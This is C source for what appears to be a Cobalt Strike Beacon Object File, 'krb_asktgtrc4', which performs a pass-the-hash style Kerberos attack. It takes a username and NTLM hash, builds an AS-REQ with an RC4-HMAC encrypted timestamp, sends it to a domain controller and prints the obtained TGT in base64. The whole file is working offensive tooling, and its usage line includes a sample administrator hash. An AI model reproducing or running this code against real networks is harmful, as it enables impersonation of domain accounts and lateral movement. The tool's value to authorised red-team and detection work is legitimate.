/*
 * krb_asktgtrc4 - Request TGT using RC4/NTLM hash (Pass-the-Hash style)
 *
 * Requests a TGT using an NTLM hash instead of password, enabling
 * pass-the-hash style attacks in Kerberos environments.
 *
 * Usage: krb_asktgtrc4 /user:USERNAME /rc4:NTHASH [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Parse hex string to bytes */
static BYTE* hex_to_bytes(const char* hex, size_t* out_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return NULL;

    *out_len = len / 2;
    BYTE* bytes = (BYTE*)malloc(*out_len);
    if (!bytes) return NULL;

    for (size_t i = 0; i < *out_len; i++) {
        char byte_str[3] = { hex[i*2], hex[i*2+1], '\0' };
        bytes[i] = (BYTE)strtoul(byte_str, NULL, 16);
    }

    return bytes;
}

/* HMAC-MD5 for RC4-HMAC encryption */
static void hmac_md5(const BYTE* key, size_t keyLen,
                      const BYTE* data, size_t dataLen,
                      BYTE* out) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    DWORD hashLen = 16;

    /* Simple HMAC-MD5 using CryptoAPI */
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        return;
    }

    /* HMAC-MD5: H(K XOR opad, H(K XOR ipad, text)) */
    BYTE ipad[64], opad[64];
    memset(ipad, 0x36, 64);
    memset(opad, 0x5c, 64);

    for (size_t i = 0; i < keyLen && i < 64; i++) {
        ipad[i] ^= key[i];
        opad[i] ^= key[i];
    }

    /* Inner hash: H(K XOR ipad, text) */
    BYTE innerHash[16];
    if (ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        ADVAPI32$CryptHashData(hHash, ipad, 64, 0);
        ADVAPI32$CryptHashData(hHash, data, (DWORD)dataLen, 0);
        ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, innerHash, &hashLen, 0);
        ADVAPI32$CryptDestroyHash(hHash);
    }

    /* Outer hash: H(K XOR opad, innerHash) */
    if (ADVAPI32$CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        ADVAPI32$CryptHashData(hHash, opad, 64, 0);
        ADVAPI32$CryptHashData(hHash, innerHash, 16, 0);
        ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, out, &hashLen, 0);
        ADVAPI32$CryptDestroyHash(hHash);
    }

    ADVAPI32$CryptReleaseContext(hProv, 0);
}

/* RC4 encryption/decryption */
static void rc4_crypt(const BYTE* key, size_t keyLen,
                       BYTE* data, size_t dataLen) {
    BYTE S[256];
    int i, j = 0;

    /* KSA */
    for (i = 0; i < 256; i++) {
        S[i] = (BYTE)i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        BYTE tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    /* PRGA */
    i = j = 0;
    for (size_t n = 0; n < dataLen; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        BYTE tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }
}

/* Derive RC4-HMAC key from NTLM hash */
static void derive_rc4_key(const BYTE* ntHash, const char* principal,
                            BYTE* key) {
    /* For RC4-HMAC, the key is just the NTLM hash */
    memcpy(key, ntHash, 16);
}

/* Create encrypted timestamp for pre-auth */
static size_t create_enc_timestamp(const BYTE* key, BYTE* out) {

    SYSTEMTIME st;
    KERNEL32$GetSystemTime(&st);


    char timestamp[32];
    sprintf(timestamp, "%04d%02d%02d%02d%02d%02dZ",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);

    /* ASN.1 encode timestamp */
    KRB_BUFFER ts_enc, ts_time, tmp;
    buf_init(&ts_enc, 128);
    buf_init(&ts_time, 64);
    buf_init(&tmp, 128);

    asn1_encode_generalized_time(&ts_time, timestamp);
    asn1_context_wrap(&ts_enc, 0, &ts_time);

    /* Optional: pausec (microseconds) */
    KRB_BUFFER usec;
    buf_init(&usec, 16);
    asn1_encode_integer(&usec, 0);
    asn1_context_wrap(&ts_enc, 1, &usec);

    asn1_wrap(&tmp, ASN1_SEQUENCE, &ts_enc);

    /* Encrypt with RC4-HMAC */
    /* The encryption is: HMAC-MD5(key, 1) -> K1, then RC4(K1, confounder + plaintext) */
    /* Plus checksum */

    BYTE usage[4] = {1, 0, 0, 0};  /* Key usage: AS-REQ PA-ENC-TIMESTAMP */
    BYTE K1[16];
    hmac_md5(key, 16, usage, 4, K1);


    BYTE confounder[8];
    HCRYPTPROV hProv;
    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        ADVAPI32$CryptGenRandom(hProv, 8, confounder);
        ADVAPI32$CryptReleaseContext(hProv, 0);
    }


    size_t ptLen = 8 + tmp.length;
    BYTE* plaintext = (BYTE*)malloc(ptLen);
    memcpy(plaintext, confounder, 8);
    memcpy(plaintext + 8, tmp.data, tmp.length);

    /* Calculate checksum: HMAC-MD5(K1, plaintext) */
    BYTE checksum[16];
    hmac_md5(K1, 16, plaintext, ptLen, checksum);

    /* Derive encryption key from checksum */
    BYTE K2[16];
    hmac_md5(K1, 16, checksum, 16, K2);

    /* Encrypt */
    rc4_crypt(K2, 16, plaintext, ptLen);

    /* Output: checksum + encrypted data */
    memcpy(out, checksum, 16);
    memcpy(out + 16, plaintext, ptLen);

    size_t result = 16 + ptLen;

    buf_free(&ts_enc);
    buf_free(&ts_time);
    buf_free(&tmp);
    buf_free(&usec);
    free(plaintext);

    return result;
}

/* Build AS-REQ with encrypted timestamp */
static void build_asreq_rc4(KRB_BUFFER* out, const char* domain,
                             const char* username, const BYTE* ntHash) {
    KRB_BUFFER asreq, pvno, msg_type, padata, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&asreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 1024);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 512);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* Message type */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* PA-DATA - encrypted timestamp */
    {
        KRB_BUFFER pa_enc_ts, pa_type, pa_value;
        buf_init(&pa_enc_ts, 512);
        buf_init(&pa_type, 16);
        buf_init(&pa_value, 512);

        asn1_encode_integer(&pa_type, PADATA_ENC_TIMESTAMP);
        asn1_context_wrap(&pa_enc_ts, 1, &pa_type);

        /* Create encrypted timestamp */
        BYTE encTs[256];
        size_t encTsLen = create_enc_timestamp(ntHash, encTs);

        /* Wrap as EncryptedData */
        KRB_BUFFER enc_data, etype_val, cipher;
        buf_init(&enc_data, 256);
        buf_init(&etype_val, 16);
        buf_init(&cipher, 256);

        asn1_encode_integer(&etype_val, ETYPE_RC4_HMAC);
        asn1_context_wrap(&enc_data, 0, &etype_val);

        asn1_encode_octet_string(&cipher, encTs, encTsLen);
        asn1_context_wrap(&enc_data, 2, &cipher);

        asn1_wrap(&pa_value, ASN1_SEQUENCE, &enc_data);
        asn1_context_wrap(&pa_enc_ts, 2, &pa_value);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_enc_ts);
        buf_append(&padata, tmp.data, tmp.length);

        buf_free(&pa_enc_ts);
        buf_free(&pa_type);
        buf_free(&pa_value);
        buf_free(&enc_data);
        buf_free(&etype_val);
        buf_free(&cipher);
    }
    buf_reset(&tmp);

    asn1_wrap(&tmp, ASN1_SEQUENCE, &padata);
    asn1_context_wrap(&asreq, 3, &tmp);
    buf_reset(&tmp);


    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Client principal */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, username);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 1, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal (krbtgt) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, "krbtgt");
        {
            KRB_BUFFER realm_str;
            buf_init(&realm_str, 128);
            asn1_encode_general_string(&realm_str, domain);
            buf_append(&tmp, realm_str.data, realm_str.length);
            buf_free(&realm_str);
        }
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Encryption types - prefer RC4 */
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&asreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_AS_REQ), &asreq);

    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* username = NULL;
    char* rc4_hash = NULL;
    char* domain = NULL;
    char* dc = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Request TGT with RC4/NTLM Hash\n\n");


    username = arg_get(&parser, "user");
    rc4_hash = arg_get(&parser, "rc4");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");

    if (!username || !rc4_hash) {
        BeaconFormatPrintf(&output, "[-] Error: /user:USERNAME and /rc4:NTHASH required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_asktgtrc4 /user:administrator /rc4:cc36cf7a8514893efccd332446158b1a\n");
        BeaconFormatPrintf(&output, "                    [/domain:DOMAIN] [/dc:DC]\n");
        goto cleanup;
    }

    if (strlen(rc4_hash) != 32) {
        BeaconFormatPrintf(&output, "[-] Error: RC4/NTLM hash must be 32 hex characters\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required\n");
        goto cleanup;
    }


    size_t hashLen;
    BYTE* ntHash = hex_to_bytes(rc4_hash, &hashLen);
    if (!ntHash || hashLen != 16) {
        BeaconFormatPrintf(&output, "[-] Error: Invalid NTLM hash format\n");
        if (ntHash) free(ntHash);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] User: %s\n", username);
    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);
    BeaconFormatPrintf(&output, "[*] RC4 Hash: %s\n\n", rc4_hash);


    WSADATA wsaData;
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
        free(ntHash);
        goto cleanup;
    }

    SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to KDC\n");
        WS2_32$WSACleanup();
        free(ntHash);
        goto cleanup;
    }

    KRB_BUFFER request;
    buf_init(&request, 4096);
    build_asreq_rc4(&request, domain, username, ntHash);

    BeaconFormatPrintf(&output, "[*] Sending AS-REQ with encrypted timestamp...\n");

    if (send_krb_msg(sock, request.data, request.length) > 0) {
        BYTE response[8192];
        int recv_len = recv_krb_msg(sock, response, sizeof(response));

        if (recv_len > 4) {
            BYTE* resp_data = response + 4;
            int resp_len = recv_len - 4;

            if (resp_data[0] == 0x6B) {
                /* AS-REP - success! */
                BeaconFormatPrintf(&output, "[+] Received AS-REP!\n");
                BeaconFormatPrintf(&output, "[+] TGT obtained successfully\n\n");

                char* b64 = b64_encode_alloc(resp_data, resp_len);
                if (b64) {
                    BeaconFormatPrintf(&output, "[*] TGT (base64):\n");
                    size_t b64len = strlen(b64);
                    for (size_t i = 0; i < b64len; i += 76) {
                        BeaconFormatPrintf(&output, "  %.76s\n", b64 + i);
                    }
                    free(b64);
                }
            } else if (resp_data[0] == 0x7E) {
                /* KRB-ERROR */
                BeaconFormatPrintf(&output, "[-] Received KRB-ERROR\n");

                /* Parse error code */
                size_t offset = 2;
                asn1_decode_length(resp_data, &offset);

                while (offset < (size_t)resp_len - 2) {
                    if (resp_data[offset] == 0xA6) {
                        offset++;
                        asn1_decode_length(resp_data, &offset);
                        if (resp_data[offset] == ASN1_INTEGER) {
                            offset++;
                            size_t int_len = asn1_decode_length(resp_data, &offset);
                            int error_code = 0;
                            for (size_t i = 0; i < int_len && i < 4; i++) {
                                error_code = (error_code << 8) | resp_data[offset + i];
                            }
                            BeaconFormatPrintf(&output, "[!] Error code: %d - %s\n",
                                error_code, krb5_error_string(error_code));
                        }
                        break;
                    }
                    offset++;
                }
            }
        }
    } else {
        BeaconFormatPrintf(&output, "[-] Failed to send request\n");
    }

    buf_free(&request);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    free(ntHash);

cleanup:
    if (username) free(username);
    if (rc4_hash) free(rc4_hash);
    if (domain) free(domain);
    if (dc) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
